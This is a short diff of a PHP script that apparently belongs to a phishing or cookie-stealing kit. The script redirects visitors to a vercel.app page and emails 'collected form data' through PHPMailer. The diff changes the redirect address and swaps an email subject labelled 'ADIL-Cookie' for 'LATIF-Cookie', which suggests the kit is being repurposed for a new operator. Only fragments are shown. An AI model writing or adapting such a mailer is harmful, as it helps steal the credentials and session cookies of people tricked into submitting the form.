@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://a-you-on-se.vercel.app/");
+header("Location:https://un-is-is.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'ADIL-Cookie';
+        $mail->Subject = 'LATIF-Cookie';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
